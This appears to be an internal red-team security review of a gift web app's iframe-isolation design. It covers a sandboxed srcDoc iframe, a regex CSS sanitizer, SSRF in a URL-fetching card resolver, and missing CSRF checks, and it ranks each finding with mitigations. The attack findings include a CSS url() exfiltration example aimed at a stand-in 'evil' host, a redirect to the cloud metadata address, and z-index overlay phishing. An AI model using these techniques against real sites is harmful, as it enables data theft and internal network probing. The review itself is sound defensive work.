# RED-TEAM — peek.gift "isolated origin" mitigation (BUILD-PLAN call §5)

> Adversarial review for the CTO. Mandate: **break the security design**; prove the
> "isolated origin neutralizes XSS" claim is harder than the one-line plan implies, and
> that "adequate" today = FAILED. READ-ONLY; all claims `file:line`-sourced from clean-slate.
>
> **Verdict up front:** the plan's framing — "model HTML served from an ISOLATED ORIGIN
> (sandbox subdomain / iframe without `allow-same-origin`) so a sanitizer miss can never
> reach Clerk/Stripe cookies" (`00-BUILD-PLAN.md:33`) — is **NOT what is built**, is
> **harder to build than stated**, and on the current clean-slate tree the recipient page is
> **same-origin** with the app. The catastrophic case is live, not theoretical.

---

## 0. GROUND TRUTH ON CLEAN-SLATE (what's actually wired, with proof)

The recipient surface mounts model HTML in an **inline `srcDoc` iframe on the SAME origin
as the app** (`apps/web/app/g/[slug]/page.tsx:27-37`):

```tsx
const srcDoc = frameDoc(sanitizeHtml(doc.presentation.html, true), "recipient");
return (
  <iframe
    srcDoc={srcDoc}
    sandbox="allow-scripts"          // <-- NO allow-same-origin (good), but...
    style={{ position: "fixed", inset: 0, width: "100%", height: "100%", ... }}
  />
);
```

`frameDoc` injects the host runtime via `<script src="/peek-runtime.js">`
(`lib/curator/page-html.ts:11-14`) — a **same-origin path on the app domain**. There is no
sandbox subdomain, no second Netlify site, no cross-origin iframe `src`. The "isolated
origin" in `00-BUILD-PLAN.md:33` exists only in prose; **nothing in `netlify.toml`, no
redirect, no DNS config, no CSP header** implements it (confirmed: `netlify.toml` has only
`[build]`/`[[plugins]]`, zero `[[headers]]`; grep for `Content-Security-Policy` /
`frame-ancestors` / `X-Frame-Options` across the tree returns **nothing** in app code).

**The one thing that IS present and load-bearing:** `sandbox="allow-scripts"` *without*
`allow-same-origin`. Per the HTML spec this gives the iframe an **opaque (null) origin**, so
script inside it **cannot** read the parent's `document.cookie` (Clerk/Stripe), cannot reach
`localStorage`, and same-origin XHR/`fetch` to the app are cross-origin/opaque. So the
**worst-case cookie theft is partially blunted by the sandbox attribute, NOT by an isolated
origin.** That distinction is the whole report: the plan's mitigation is mis-described, and
the protection that exists is one HTML attribute one careless edit away from removal.

**Is the recipient page same-origin with Clerk/Stripe cookies? (the catastrophic case.)**
- The **outer page** `/g/<slug>` is served from the app origin and CAN see app cookies.
- The **iframe content** (the untrusted model HTML) is sandboxed to a null origin and
  **cannot** — *as long as `allow-same-origin` is never added.* If anyone adds it (to "fix"
  the runtime, see §2), the iframe becomes same-origin and a sanitizer miss reaches every
  Clerk/Stripe cookie. **This is one line from catastrophe, with active pressure to cross it.**

**Auth posture making it worse:** there is **no `middleware.ts` / `proxy.ts`** anywhere in
`apps/web` (glob: no match). Clerk is not in the request path at all on clean-slate. The
corpus already flags Clerk "fails OPEN" (`decisions-bugs.md` Z2) and `/api/curator` is
unauthenticated/unrate-limited (`api/curator/route.ts` — no auth, defaults `curatorId` to
client-supplied; `decisions-bugs.md` Z1). So the perimeter the isolated origin is meant to
backstop is itself wide open.

---

## 1. ATTACKS THAT LAND TODAY (clean-slate, as-built)

### A1 — CSS overlay clickjack / phishing of the recipient (DOMPurify does NOT touch this). [HIGH]
`sanitize.ts` allows `style`, `class`, `id` on virtually every tag (`ALLOWED_ATTR:17`,
`ALLOW_DATA_ATTR:true`) and allows `<style>` blocks (`ALLOWED_TAGS:6`). The **only** CSS
filtering is `sanitizeCssText` (`sanitize.ts:42-48`), which strips exactly four things:
`@import`, `expression(`, `behavior:`/`-moz-binding`, and `url(javascript:)`. It does **NOT**
restrict `position:fixed`, `z-index`, viewport sizing, or `url()` to remote hosts. So model
(or, via a compromised/poisoned resolve, attacker) HTML can paint a **full-viewport
`position:fixed; inset:0; z-index:99999` overlay** that:
- covers the real `data-peek-*` order bar with a fake "Send my picks / Pay $12" CTA that
  links anywhere, or overlays a credential-harvest skin. The runtime's own injected bar sits
  at `z-index:8000` and the sheet at `9000` (`peek-runtime.js:128,164`), so any author CSS at
  `z-index:9001+` wins. Forms are stripped (`FORBID_TAGS:37`), but an `<a href>` styled as a
  button, or a `url()`-on-`:active` exfil, is not.
- **This works inside the sandbox** — it doesn't need script, it's pure CSS, and the iframe
  fills the entire screen (`page.tsx:35` `position:fixed; inset:0`). The recipient sees a
  full-bleed page they trust ("the gift") and the overlay is indistinguishable.

**The corpus understated this.** §7.2 calls it "neutralize full-viewport overlays" as a
to-do; it is **not done** — `sanitizeCssText` has no overlay heuristic. Quote, verbatim, the
entire CSS defense:
```js
function sanitizeCssText(css) {
  return css
    .replace(/@import[^;]*;?/gi, "")
    .replace(/expression\s*\(/gi, "/*x*/(")
    .replace(/(?:behavior|-moz-binding)\s*:[^;}]*/gi, "")
    .replace(/url\(\s*(['"]?)\s*javascript:[^)]*\)/gi, "url()");
}
```

### A2 — CSS `url()` exfiltration (background-image / @font-face leak). [HIGH]
The `url(javascript:)` filter is the ONLY `url()` rule. `background-image:url(https://evil/x?d=...)`,
`@font-face{src:url(https://evil/...)}`, and `cursor:url(...)` all pass untouched. Any state
the page can express in CSS (`:hover`, `:checked` via the runtime's class toggles,
attribute-selector matches on injected DOM) becomes a **side-channel GET to an
attacker host** — leaking recipient behavior, and any text the model embedded (recipient
name, note, in-jokes, which cards were picked since the runtime toggles classes like
`chosen-on` / `data-peek-picked`, `peek-runtime.js:48-51`). Inside the sandbox the
**network is NOT restricted** (no CSP `connect-src`/`img-src`; `allow-scripts` permits
outbound requests), so exfil egress is wide open. **The regex defense does nothing here.**

### A3 — SSRF via `resolve_card` / `productSource.fromUrl` (no allowlist, follows redirects). [HIGH]
`resolve_card` passes model/user `text` straight to `cardResolver.resolve`
(`turn.ts:96-102`), which routes a URL to `productSource.fromUrl` →
`fetchHtml(url, true)` (`lib/ports/card-resolver.ts:144-174`). The fetch:
```js
const res = await fetch(reqUrl, { redirect: "follow", headers: ..., signal: ctrl.signal });
```
- **No host allowlist, no IP/DNS validation, no block on private ranges.** `redirect:"follow"`
  means a public URL that 302s to `http://169.254.169.254/...` (cloud metadata),
  `http://127.0.0.1:port`, or internal Supabase/Netlify service hosts is followed.
- The **response body is parsed and returned to the model** (`parseHtml` → card title/desc/
  image), so this is an SSRF with a **read-back channel** — an attacker who can steer a
  curator turn (or the model itself, hallucinating a URL) can probe internal services and
  surface fragments (titles, og: tags, JSON-LD) back into the page/chat.
- ZenRows fallback (`card-resolver.ts:164-169`) only triggers when the direct fetch yields no
  title — the **direct unguarded fetch happens first, every time.**

This is on the **curator/authoring** path, not the recipient path, so the isolated origin
does **nothing** for it — it's a server-side hole orthogonal to the iframe.

### A4 — fal image fetch SSRF + safety checker OFF. [MEDIUM]
`generateHero` posts to fal and then **re-fetches `body.images[0].url`** server-side
(`lib/ports/image.ts:42-47`) with no validation, storing the bytes. fal's returned URL is
trusted; more notable: `enable_safety_checker:false` (`image.ts:33`) — **NSFW/abuse image
generation is unfiltered**, and the corpus confirms image moderation is "absent"
(`00-CORPUS §5.1` launch gates). The upload route (`api/upload/route.ts`) is comparatively
sane (mime allowlist, 10MB cap) but accepts `image/gif` and does **no content sniffing** — a
polyglot GIF/HTML is storable, though it's served from the Supabase public bucket (different
origin) so impact is limited.

### A5 — `/api/pick` has no origin/CSRF check and `decidePick` is called WITHOUT caps. [MEDIUM]
`api/pick/route.ts:22`:
```ts
const r = decidePick(doc, current, { type: "toggle", cardId: body.cardId });
```
No 4th `caps` arg — exactly the dead-enforcement bug the corpus names
(`decisions-bugs.md` §2F / `00-CORPUS §3.4`). **Server-side hard/soft cap is non-functional;
the thermometer is cosmetic.** Plus the route checks no `Origin`/`Referer` and sets no
auth — any site can POST picks for any known slug (cap-bypass + pick stuffing). Low
direct severity (no money moves on pick), but it's the rules engine the plan calls "the
genuinely defensible core" running disarmed.

### A6 — DOMPurify config loosenings worth flagging. [LOW-MED]
`ALLOW_DATA_ATTR:true` + a broad SVG allowlist incl. `<foreignObject>`, `<use>`,
`xlink:href`, `<image>` (`sanitize.ts:11-15,28`). `<base>` and `http-equiv` are forbidden
(good — kills one CSP-less redirect/meta-refresh vector), but `<foreignObject>`+SVG is a
historically rich mutation-XSS surface and DOMPurify version is **not pinned in this file**
(corpus: "pin DOMPurify"). `isomorphic-dompurify` parses with **jsdom server-side**, a
different parser than the browser that ultimately renders — mXSS divergence risk. The
isolated origin is the backstop *precisely because* a DOMPurify bypass is plausible; that
backstop is the part not built.

---

## 2. IS THE ISOLATED ORIGIN BUILDABLE? — yes, but with real gotchas the one-liner hides

The plan treats "serve from a sandbox subdomain / iframe without `allow-same-origin`" as a
single safe lever. Two *different* mechanisms are conflated, and they fight the product:

### 2.1 The hard conflict: sandbox WITHOUT `allow-same-origin` mostly works HERE — because the runtime was built for it. But it caps what the runtime can ever do.
- The current runtime (`peek-runtime.js`) is **entirely DOM-local**: it reads `data-peek-*`
  attributes, toggles classes, manages an in-memory `order{}` object (`:27`), and on the CTA
  calls `cfg.onAction(type, summary)` (`:178-183`). It uses **no `localStorage`, no
  `document.cookie`, no `fetch`** — so a null-origin sandbox does **not** break it *as it
  stands*. Good.
- **But** `cfg.onAction` is currently a `console.log` no-op in recipient mode
  (`peek-runtime.js:182`). The actual pick persistence in the SSR fallback path goes through
  `recipient-view.tsx:18` `fetch("/api/pick", ...)` — which runs in the **React component on
  the app origin, NOT in the iframe.** On the freeform/iframe path, **there is no bridge
  wired yet** from the sandboxed CTA back to `/api/pick`. The corpus confirms this is an open
  gap: "gaps = publish-CTA + pick postMessage-bridge" (`00-CORPUS §4.1`).
- So the moment you wire "picking still works" on the iframe path, you must add a
  **`postMessage` bridge** (sandboxed iframe → parent → `/api/pick`). That bridge is where the
  isolated-origin design gets hard:
  - **`postMessage` from a null-origin (sandboxed-no-same-origin) iframe sends `event.origin === "null"`.** The parent listener cannot validate origin by string match — it must
    validate by `event.source === iframeRef.contentWindow` and treat the payload as fully
    untrusted (the iframe content is attacker-controlled HTML). Get this wrong and you've
    built a confused-deputy: untrusted iframe drives privileged parent fetches.
  - A **sandbox subdomain** (`sandbox.peek.gift`) is the cleaner design (real cross-origin,
    CORS-controlled `postMessage` with a checkable origin), but then `postMessage` between
    `sandbox.peek.gift` and `peek.gift` needs an **exact-origin allowlist** on both ends, and
    the picks API must accept cross-origin POSTs → **CORS + CSRF rules** the current
    `/api/pick` has none of (§A5).

### 2.2 Buildable on Netlify? — yes, but it's multi-part, not a flag.
- A **second Netlify site** (or a branch-subdomain) for `sandbox.peek.gift` + a DNS record +
  a Clerk "authorized origin" entry. The corpus already calls the *cutover* DNS/Clerk-origin
  dance non-trivial (`00-CORPUS §5.2`). Adding a sandbox origin doubles that surface.
- **CSP must actually ship** — today there are **zero `[[headers]]` in `netlify.toml`** and no
  CSP anywhere. The isolated origin without a CSP still leaks via §A2 (`url()` exfil is
  unaffected by origin isolation). You need BOTH: origin isolation (cookie containment) AND a
  CSP `connect-src/img-src/font-src/style-src` (exfil containment). The plan names CSP but the
  build has none — and `@netlify/plugin-nextjs` + Next streaming/`next/og` makes a strict
  `script-src 'self'` CSP fiddly (nonces per request).
- **Clerk/Stripe MUST live in the parent.** They cannot run inside a null-origin or
  cross-origin sandbox iframe (no cookies, no Clerk session, Stripe.js needs its own
  same-origin context). So the architecture is forced into: **parent = trusted shell
  (Clerk/Stripe/CTA) + child = untrusted art.** The CTA the recipient taps ("Send my picks",
  later "$12") therefore must live in the **parent**, drawn by the parent — but the *design*
  (`00-CORPUS §2.6`) wants the author to style the CTA inside the page. **That is the concrete
  conflict between "safe enough" and "picking/paying still works":** either the money/pick CTA
  is a parent-drawn chrome element (breaks the seamless authored look) or it lives in the
  untrusted iframe and you trust a `postMessage` from attacker HTML to move money. There is no
  free lunch; the plan's one line hides this fork.

### 2.3 The silent-regression trap.
Because `allow-same-origin` would make the iframe "just work" (localStorage, direct
`/api/pick` fetch, no bridge), a future session under delivery pressure will be **tempted to
add it** to ship the pick loop fast — instantly converting A1/A2/A6 from "annoying" to
"steals Clerk/Stripe session." The protection is an **invisible single attribute** with no
test guarding it (the sanitize tests don't assert the iframe sandbox flags). **A CI gate must
assert `sandbox` never contains `allow-same-origin` on the recipient route**, or this WILL
regress.

---

## 3. RANKED FINDINGS + MITIGATIONS

| # | Finding | Sev | Lands today? | Mitigation | Class |
|---|---------|-----|--------------|------------|-------|
| A3 | SSRF via `resolve_card`→`fromUrl` fetch, follows redirects, reads back | **HIGH** | YES (curator path) | Allowlist public hosts; resolve DNS + block RFC1918/link-local/`169.254.0.0/16`/`::1`; `redirect:"manual"` + re-validate each hop; egress proxy | **TACTICAL** |
| A1 | CSS full-viewport `position:fixed` overlay clickjack/phish inside iframe | **HIGH** | YES (recipient) | Real CSS sanitizer/parser (not regex): forbid `position:fixed`+full-viewport in author CSS, or run author HTML in a non-fullscreen framed region; CSP `frame-ancestors` won't help here (it's inside our own frame) | **STRATEGIC** |
| A2 | CSS `url()` exfil (`background-image`/`@font-face`/`cursor`) | **HIGH** | YES (recipient) | Ship a CSP with `img-src/font-src/connect-src/style-src` allowlist on the iframe response; rewrite/allowlist `url()` hosts in the CSS sanitizer | **STRATEGIC** |
| ISO | "Isolated origin" claimed but NOT built; protection rests on one `sandbox` attr; `allow-same-origin` one edit from catastrophe; no CSP, no sandbox subdomain | **HIGH** | (latent / config) | Build the real isolated origin (sandbox subdomain OR keep no-same-origin + add CSP) AND add a **CI test asserting the recipient iframe never has `allow-same-origin`** + a header test asserting CSP present | **STRATEGIC** |
| A4 | fal `enable_safety_checker:false` + server re-fetch of returned URL; no image moderation | MED | YES | Turn safety checker on / add moderation port call before store; validate fal URL host | TACTICAL |
| A5 | `/api/pick` no caps to `decidePick`, no origin/CSRF/auth check | MED | YES | Pass `caps` (close dead enforcement); add `Origin` allowlist + per-IP rate limit; this MUST be designed alongside the postMessage bridge | TACTICAL |
| BRIDGE | Pick/CTA postMessage bridge unbuilt; building it is where isolation gets hard (null origin = `event.origin==="null"`; confused-deputy risk) | MED | (gap) | Validate `event.source===contentWindow`, treat payload as untrusted, re-derive everything server-side from slug; prefer sandbox subdomain + exact-origin check | **STRATEGIC** |
| A6 | DOMPurify not pinned here; `ALLOW_DATA_ATTR`, SVG `<foreignObject>`/`<use>`; jsdom-vs-browser mXSS divergence | LOW-MED | (latent) | Pin DOMPurify exact version; trim SVG allowlist; add an mXSS/exfil corpus to `sanitize.test.ts`; the isolated origin is the backstop for the inevitable bypass | TACTICAL |
| AUTH | No middleware/proxy; Clerk not in request path; `/api/curator` unauth + unmetered (open wallet) | HIGH (separate) | YES | Out of this report's scope but it's the perimeter the isolation backstops — gate before any keyed deploy (corpus Z1/Z2) | STRATEGIC |

**Why STRATEGIC vs TACTICAL:** the regex CSS sanitizer (`sanitizeCssText`) is the wrong tool —
it cannot reason about overlays, layout, or `url()` hosts, so A1/A2 are not patchable with
another regex; they need a real CSS-AST sanitizer + a shipped CSP, and the iframe→parent CTA
boundary is an architecture decision, not a fix. Those are STRATEGIC. SSRF allowlisting, caps
wiring, pinning DOMPurify, and the fal safety flag are bounded code changes — TACTICAL.

---

## 4. THE ONE-PARAGRAPH ANSWER TO "IS ISOLATED ORIGIN ADEQUATE?"

**No — as worded and as built it FAILS.** (1) It is **not built**: the recipient iframe is a
same-origin inline `srcDoc` whose only real protection is `sandbox="allow-scripts"` (no
`allow-same-origin`) — a single attribute, untested, under active pressure to be removed the
moment someone wires the pick loop. (2) Origin isolation **alone is insufficient**: it
contains cookies but does **nothing** for the two highest-value recipient-side attacks that
land today — CSS full-viewport clickjack (A1) and `url()`/`@font-face` exfil (A2) — both of
which the regex CSS sanitizer does not touch and which **require a real CSS sanitizer + a
shipped CSP** the build does not have. (3) The biggest server hole — SSRF via `resolve_card`
(A3) — is on the curator path and is **orthogonal** to the iframe entirely, so no amount of
origin isolation helps it. (4) Making isolation real **conflicts with the product**: Clerk/
Stripe/CTA must live in the parent, the pick/pay CTA the design wants authored-in-the-page
must either become parent chrome (breaks the look) or trust a `postMessage` from attacker
HTML (confused-deputy) — a fork the one-line plan hides. The mitigation is buildable on
Netlify (second site/subdomain + DNS + Clerk origin + CSP headers + a postMessage bridge with
`event.source` validation + a CI gate on the sandbox attr), but it is a **multi-part build,
not a flag**, and is necessary-but-not-sufficient without the CSS sanitizer and CSP.
